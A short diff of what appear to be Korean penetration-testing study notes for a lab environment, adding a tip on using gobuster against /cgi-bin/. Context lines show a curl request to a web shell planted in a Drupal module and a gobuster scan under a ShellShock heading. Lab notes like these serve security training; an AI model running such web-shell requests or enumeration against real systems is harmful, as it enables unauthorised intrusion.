@@ -1209,6 +1209,7 @@ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b76
 ```
 
 ## Apache
+- `gobuster`를 사용할 때 `/cgi-bin`이 파일로 취급되는 경우가 있어 `/cgi-bin/`를 wordlist에 추가해서 검색.
 ### ShellShock
 ```bash
 gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi,sh,pl,py
